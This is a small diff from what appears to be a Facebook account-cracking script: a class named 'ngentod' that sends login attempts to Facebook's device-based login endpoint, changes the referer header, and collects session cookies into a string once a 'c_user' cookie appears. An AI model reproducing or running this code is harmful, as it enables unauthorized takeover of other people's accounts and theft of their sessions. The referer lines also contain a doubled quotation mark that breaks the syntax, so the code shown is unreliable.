@@ -793,7 +793,7 @@ class ngentod:
                 	data.update({i.get('name'): i.get('value')})
             data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
             '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
-            ses.headers.update({'referer': ''https://graph.facebook.com'})
+            ses.headers.update({'referer': ''https://touch.facebook.com'})
             po = ses.post('https://graph.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fgraph.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
